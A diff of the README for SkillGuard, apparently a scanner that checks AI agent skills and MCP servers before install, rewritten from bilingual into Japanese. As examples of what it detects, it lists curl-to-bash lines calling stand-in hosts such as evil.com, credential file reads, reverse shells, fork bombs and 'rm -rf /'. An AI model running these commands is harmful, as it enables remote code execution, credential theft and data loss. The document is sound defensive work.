@@ -1,172 +1,210 @@
 # SkillGuard
 
-**Agent skills are executable supply chains. Trust nothing you install.**
-
-エージェントスキルは実行可能なサプライチェーンです。インストールするものは何も信頼しないでください。
-
----
-
-## Overview / 概要
-
-**English:** SkillGuard is a security scanner and "Skill Admission Controller" for AI Agent skills, plugins, MCP (Model Context Protocol) servers, and their dependencies. Before you install or deploy any agent skill, SkillGuard scans it for malicious patterns, credential theft, supply chain risks, and dangerous capabilities — blocking threats before they execute.
-
-**日本語:** SkillGuardは、AIエージェントスキル、プラグイン、MCP（Model Context Protocol）サーバー、およびその依存関係のためのセキュリティスキャナー兼「スキルアドミッションコントローラー」です。エージェントスキルをインストールまたはデプロイする前に、悪意のあるパターン、認証情報の窃取、サプライチェーンリスク、危険な機能をスキャンし、実行前に脅威をブロックします。
+> **"Agent skills are executable supply chains. Trust nothing you install."**
+>
+> エージェントスキルは実行可能なサプライチェーンです。インストールするものを盲目的に信頼してはいけません。
 
 ---
 
-## Why SkillGuard? / なぜSkillGuardが必要か？
+## SkillGuardとは
 
-The rise of AI agents has created a new attack surface: **agent skills and plugins**. These are code packages that agents download and execute — often automatically, often with broad system permissions.
+SkillGuardは、**AIエージェントのSkill・Plugin・MCPサーバー・依存関係**を、インストール前にセキュリティ審査するツールです。
 
-**installするだけで侵入される時代** — In the era where merely installing a package can compromise your system, SkillGuard provides a critical last line of defense.
+単なるスキャナーではなく、「**Skill Admission Controller**」として設計されています。
+脅威を検知するだけでなく、リスクに応じて**導入可否を自動判定**します。
 
-Common attack patterns SkillGuard detects:
-- `curl https://evil.com | bash` — Remote code execution at install time
-- `.pth` file injection — Python path manipulation for persistence
-- Credential harvesting — Reading `~/.aws/credentials`, `~/.ssh/id_rsa`
-- Supply chain attacks — Typosquatted packages, unpinned dependencies
-- MCP server abuse — `autoApprove: ["*"]`, unrestricted shell access
-- Obfuscated payloads — base64, hex-encoded, ROT13 commands
+### なぜ必要なのか
 
----
+```
+installするだけで侵入される時代
+```
 
-## Features / 機能
+AIエージェント（Claude Code、Cowork など）は、スキルやプラグインをダウンロードして実行します。
+その際、以下のような攻撃が仕掛けられる可能性があります：
 
-- **100+ security rules** across 8 categories: execution, persistence, credentials, network, supply chain, MCP/agent, obfuscation, destructive
-- **Multi-target scanning**: Local files, local directories, GitHub repositories
-- **MCP configuration analysis**: Detects dangerous MCP server settings
-- **SBOM generation**: Software Bill of Materials for dependency tracking
-- **Allowlist support**: `.skillguard.yaml` and inline `# skillguard:ignore` comments
-- **CI/CD integration**: GitHub Actions workflow included
-- **Multiple output formats**: Human-readable text (with Rich colors) and JSON
-- **Three operating modes**: `report`, `warn`, `enforce`
-- **Risk scoring**: 0-100 score with PASS/REVIEW/BLOCK decisions
-- **Dangerous combination detection**: Automatic BLOCK for high-risk capability combos
+| 攻撃手法 | 具体例 |
+|---------|--------|
+| インストール時リモートコード実行 | `curl https://evil.com/payload.sh \| bash` |
+| Pythonパス汚染（永続化） | `.pth` ファイルによるコード注入 |
+| 認証情報窃取 | `~/.aws/credentials`、`~/.ssh/id_rsa` の読み取りと外部送信 |
+| サプライチェーン攻撃 | タイポスクワッティング、バージョン未固定の依存関係 |
+| MCPサーバー悪用 | `autoApprove: ["*"]`、無制限シェルアクセス |
+| 難読化ペイロード | base64・hex・ROT13でエンコードされたコマンド |
 
 ---
 
-## Quick Start / クイックスタート
+## クイックスタート
 
-### Installation
+### インストール
 
 ```bash
 pip install skillguard
 ```
 
-### Basic Scan
+### スキャン実行
 
 ```bash
-# Scan a local skill directory
+# ローカルディレクトリをスキャン
 skillguard scan ./my-skill/
 
-# Scan a single file
+# 単一ファイルをスキャン
 skillguard scan ./install.sh
 
-# Scan a GitHub repository
+# GitHubリポジトリをスキャン
 skillguard scan github:owner/repo
 ```
 
-### Sample Output
+### 出力例
 
 ```
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
   SkillGuard Security Scan Report
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 Target:   ./my-skill/
-Score:    20/100
+Score:    0/100
 Decision: BLOCK
 
 Execution Surface: install, hook
-Capabilities: shell, network
-Asset Exposure: credential
+Capabilities:      shell, network
+Asset Exposure:    credential
 
 Findings (3):
   [CRITICAL] exec_curl_pipe_sh
-    File: install.sh:5
+    Title: curl piped to shell
+    File:  install.sh:5
     Match: curl https://evil-server.com/payload.sh | bash
-    ...
+    Info:  リモートスクリプトのダウンロードと実行はサプライチェーン攻撃の典型的な手法です。
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+BLOCKED - 深刻なセキュリティ問題が検出されました。インストールしないでください。
 ```
 
 ---
 
-## Scan Modes / スキャンモード
+## リスクスコアリング
 
-| Mode | Description | Exit Code (PASS) | Exit Code (REVIEW) | Exit Code (BLOCK) |
-|------|-------------|-----------------|-------------------|------------------|
-| `report` | Always exits 0, outputs findings | 0 | 0 | 0 |
-| `warn` | Exits non-zero on findings | 0 | 1 | 2 |
-| `enforce` | Strict mode with blocking messages | 0 | 1 | 2 |
+スコアは100点からスタートし、検出された問題の深刻度に応じて減点されます。
+
+| 深刻度 | 減点 | 例 |
+|--------|------|-----|
+| CRITICAL | -40 | `curl \| bash`、認証情報の外部送信 |
+| HIGH | -20 | crontabによる永続化、リバースシェル |
+| MEDIUM | -10 | バージョン未固定の依存関係、疑わしいMCP設定 |
+| LOW | -5 | 軽微な設定ミス |
+
+**判定基準：**
+
+```
+スコア 80以上 → PASS   (安全)
+スコア 50〜79 → REVIEW (要確認)
+スコア 50未満 → BLOCK  (ブロック)
+```
+
+スコアに関わらず、以下の危険な組み合わせが検出された場合は**自動的にBLOCK**になります：
+
+- `インストール時 + シェル実行 + 認証情報アクセス` → **強制BLOCK**
+- `フック実行 + ネットワーク送信 + シークレット` → **強制BLOCK**
+
+---
+
+## モード説明
+
+| モード | 動作 | CIでの用途 |
+|--------|------|------------|
+| `report`（デフォルト） | 結果を表示するだけ、常に終了コード0 | 導入初期・様子見 |
+| `warn` | REVIEW→終了コード1、BLOCK→終了コード2 | 通常運用 |
+| `enforce` | warnと同じだが、より厳格なメッセージ | 本番環境・厳格運用 |
 
 ```bash
-# Report mode (default) - never fails CI
+# デフォルト（結果表示のみ、CIは失敗しない）
 skillguard scan . --mode report
 
-# Warn mode - fails CI on REVIEW or BLOCK
+# 問題があればCIを失敗させる
 skillguard scan . --mode warn
 
-# Enforce mode - same as warn with stricter messaging
-skillguard scan . --mode enforce --format json
+# 厳格モード（本番環境向け）
+skillguard scan . --mode enforce
+
+# 閾値のカスタマイズ（デフォルトはPASS=80、REVIEW=50）
+skillguard scan . --mode enforce --threshold 70
 ```
 
----
+**終了コード：**
 
-## Risk Scoring / リスクスコアリング
-
-SkillGuard calculates a risk score starting at 100, with deductions per finding:
-
-| Severity | Deduction |
-|----------|-----------|
-| CRITICAL | -40 |
-| HIGH | -20 |
-| MEDIUM | -10 |
-| LOW | -5 |
-| INFO | 0 |
-
-**Decision thresholds** (customizable with `--threshold`):
-- Score ≥ 80 → **PASS**
-- Score 50-79 → **REVIEW**
-- Score < 50 → **BLOCK**
-
-**Automatic BLOCK** regardless of score for dangerous capability combinations:
-- `INSTALL + SHELL + CREDENTIAL` → Always BLOCK
-- `HOOK + NETWORK + SECRET` → Always BLOCK
+| 判定 | 終了コード |
+|------|-----------|
+| PASS | `0` |
+| REVIEW | `1`（warn/enforceモード） |
+| BLOCK | `2`（warn/enforceモード） |
 
 ---
 
-## Allowlist / 許可リスト
+## 検出ルール（100種類以上）
 
-Create `.skillguard.yaml` in your project root:
+8つのカテゴリで100種類以上のルールを実装しています。
+
+### 実行系（15種類）
+`curl|bash`、`wget|sh`、`base64 -d | bash`、`os.system()`、`eval()`、`subprocess shell=True`、PowerShellエンコードコマンド など
+
+### 永続化（10種類）
+`.pth`ファイル注入、`sitecustomize.py`改ざん、`crontab`変更、`systemd`サービス登録、`.bashrc`改ざん、gitフック汚染 など
+
+### 認証情報アクセス（20種類）
+`~/.aws/credentials`、`~/.ssh/id_rsa`、`.env`ファイル、`kubeconfig`、GCPサービスアカウント、ブラウザCookieストレージ、各種APIキーのハードコード など
+
+### ネットワーク・情報漏洩（15種類）
+外部へのPOST送信、rawソケット、リバースシェル、ngrokトンネル、pastebin送信、C2ビーコンパターン など
+
+### サプライチェーン（15種類）
+バージョン未固定の依存関係、ロックファイル欠如、カスタムPyPI/npmレジストリ、タイポスクワッティングパターン、git+URLによる依存関係 など
+
+### MCP・エージェントリスク（10種類）
+`autoApprove: ["*"]`、`trust: all`、無制限シェルMCP、システムディレクトリへの書き込み権限、自動実行設定 など
+
+### 難読化（10種類）
+base64エンコードペイロード、16進数コマンド、`eval(atob(...))`、`compile()` + `exec()`、文字コード連結 など
+
+### 破壊的操作（5種類）
+`rm -rf /`、フォーク爆弾、ディスクワイプ、`DROP DATABASE`、`shred -u` など
+
+---
+
+## 許可リスト（Allowlist）
+
+既知の安全なパターンは許可リストに登録できます。
+
+### プロジェクトルートに `.skillguard.yaml` を作成
 
 ```yaml
-# Rules to globally ignore
+# 特定ルールをグローバルに無視
 ignore_rules:
   - sc_requirements_no_hash
   - sc_npm_unpinned
 
-# Files to skip entirely
+# 特定ファイルをスキャン対象外に
 ignore_files:
   - test_install.sh
 
-# Path prefixes to skip
+# 特定ディレクトリをスキャン対象外に
 ignore_paths:
   - tests/
   - fixtures/
 ```
 
-Or use inline comments:
+### インラインコメントで行単位に無視
 
 ```bash
-# This is a known-safe pattern
+# 既知の安全なパターンを1行だけ無視する
 curl https://raw.githubusercontent.com/pypa/pip/main/get-pip.py | python  # skillguard:ignore exec_curl_pipe_sh
 ```
 
 ---
 
-## CI Integration / CI連携
+## CI連携
 
 ### GitHub Actions
 
-Add to `.github/workflows/skillguard.yml`:
+PRのたびに自動でスキャンを実行します。`.github/workflows/skillguard.yml` を作成してください：
 
 ```yaml
 name: SkillGuard Security Scan
@@ -181,14 +219,18 @@ jobs:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
+
       - uses: actions/setup-python@v5
         with:
           python-version: "3.11"
-      - name: Install SkillGuard
+
+      - name: SkillGuardをインストール
         run: pip install skillguard
-      - name: Run SkillGuard Scan
+
+      - name: セキュリティスキャン実行
         run: skillguard scan . --mode warn --format json > skillguard-report.json
-      - name: Upload Report
+
+      - name: レポートをアーティファクトとして保存
         uses: actions/upload-artifact@v4
         if: always()
         with:
@@ -196,7 +238,14 @@ jobs:
           path: skillguard-report.json
 ```
 
-### Pre-commit Hook
+**enforceモードに切り替える場合：**
+
+```yaml
+# --mode warn → --mode enforce に変更するだけ
+run: skillguard scan . --mode enforce
+```
+
+### pre-commit フック
 
 ```yaml
 # .pre-commit-config.yaml
@@ -212,97 +261,101 @@ repos:
 
 ---
 
-## Rule Categories / ルールカテゴリ
+## JSON出力
 
-| Category | Rules | Description |
-|----------|-------|-------------|
-| `execution` | 15+ | Remote code execution patterns |
-| `persistence` | 10+ | System persistence mechanisms |
-| `credentials` | 20+ | Credential access and theft |
-| `network` | 15+ | Network exfiltration patterns |
-| `supply_chain` | 15+ | Dependency security issues |
-| `mcp_agent` | 10+ | MCP server misconfigurations |
-| `obfuscation` | 10+ | Code obfuscation techniques |
-| `destructive` | 5+ | System-destructive patterns |
-
----
-
-## JSON Output / JSON出力
+機械処理やダッシュボード連携向けにJSON形式で出力できます。
 
 ```bash
+skillguard scan . --format json
 skillguard scan . --format json | jq '.decision'
+skillguard scan . --format json | jq '.findings[].severity'
 ```
 
 ```json
 {
   "target": "./my-skill/",
-  "score": 20,
+  "score": 0,
   "decision": "BLOCK",
-  "findings": [...],
-  "execution_surfaces": ["install"],
+  "findings": [
+    {
+      "rule_id": "exec_curl_pipe_sh",
+      "title": "curl piped to shell",
+      "severity": "CRITICAL",
+      "file_path": "install.sh",
+      "line_number": 5,
+      "matched_text": "curl https://evil-server.com/payload.sh | bash"
+    }
+  ],
+  "execution_surfaces": ["install", "hook"],
   "capabilities": ["shell", "network"],
   "asset_exposure": ["credential"],
   "scanned_files": ["install.sh", "requirements.txt"],
-  "sbom": {"packages": [...]},
-  "duration_seconds": 0.042
+  "sbom": {
+    "packages": [
+      {"name": "requests", "version": "2.31.0", "ecosystem": "pip"}
+    ]
+  },
+  "duration_seconds": 0.09
 }
 ```
 
 ---
 
-## GitHub Repository Scanning / GitHubリポジトリのスキャン
+## サンプルファイル
+
+動作確認用のサンプルが `samples/` ディレクトリに含まれています。
 
 ```bash
-# Scan a public GitHub repository
-skillguard scan github:owner/repo-name
+# 安全なスキル → PASS (100/100)
+skillguard scan samples/benign/
 
-# Or with full URL
-skillguard scan https://github.com/owner/repo-name
+# curl|bash 攻撃 → BLOCK (0/100)
+skillguard scan samples/curl_sh/
+
+# 認証情報窃取 → BLOCK (0/100)
+skillguard scan samples/credential_steal/
+
+# フォーク爆弾 → REVIEW (60/100)
+skillguard scan samples/fork_bomb/
+
+# .pthファイル注入 → REVIEW (60/100)
+skillguard scan samples/pth_attack/
 ```
-
-SkillGuard clones the repository to a temporary directory, scans it, and cleans up automatically.
 
 ---
 
-## Contributing / コントリビューション
+## カスタムルールの追加
 
-Contributions are welcome. To add new rules, create or edit YAML files in the `rules/` directory:
+`rules/` ディレクトリにYAMLファイルを追加するだけで、独自ルールを定義できます。
 
 ```yaml
 rules:
-  - id: your_rule_id
-    title: "Human readable title"
-    description: "What this detects and why it matters"
+  - id: my_custom_rule
+    title: "カスタム検出ルール"
+    description: "このルールが検出する内容と、なぜ危険なのかを記述"
     category: execution
-    severity: HIGH
+    severity: HIGH          # CRITICAL / HIGH / MEDIUM / LOW / INFO
     file_patterns:
       - "*.sh"
       - "*.py"
     patterns:
-      - "regex_pattern_here"
-    execution_surface: [install]
-    capabilities: [shell]
-    asset_reach: []
+      - "危険なパターンの正規表現"
+    execution_surface: [install]   # install / hook / runtime / manual
+    capabilities: [shell]          # shell / network / filesystem / process
+    asset_reach: []                # credential / secret / key / config
 ```
 
 ---
 
-## License / ライセンス
+## 動作要件
 
-MIT License
+- Python 3.9 以上
+- 依存パッケージ: `click`, `pyyaml`, `rich`
+- スキャン時間: 通常5秒以内
+- 外部API通信: なし（完全オフライン動作）
 
-Copyright (c) 2026 SkillGuard Contributors
+---
 
-Permission is hereby granted, free of charge, to any person obtaining a copy
-of this software and associated documentation files (the "Software"), to deal
-in the Software without restriction, including without limitation the rights
-to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
-copies of the Software, and to permit persons to whom the Software is
-furnished to do so, subject to the following conditions:
+## ライセンス
 
-The above copyright notice and this permission notice shall be included in all
-copies or substantial portions of the Software.
-
-THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
-IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
-FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT.
+MIT License — Copyright (c) 2026 SkillGuard Contributors
